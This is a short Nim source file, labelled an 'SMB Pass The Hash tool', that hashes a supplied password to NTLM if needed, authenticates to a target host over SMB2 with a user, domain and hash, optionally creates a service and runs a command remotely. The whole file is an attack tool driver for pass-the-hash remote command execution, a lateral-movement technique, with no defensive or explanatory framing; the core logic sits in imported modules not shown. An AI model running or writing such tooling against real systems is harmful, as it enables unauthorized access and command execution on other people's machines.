#[
    SMB Pass The Hash tool
]#

import SMBExec, Help

proc run() =
    var smb: SMB2
    
    if pass != "":
        hash = toNTLMHash(pass)
        printC(Info, pass & " Converted to => " & hash)
    
    if service != "":
        smb = newSMB2(target, domain, user, hash, service)
    else:
        smb = newSMB2(target, domain, user, hash)
    
    let response = smb.connect()

    smb.exec(command, response)

    smb.close()

when isMainModule:
    checkParams()
    run()
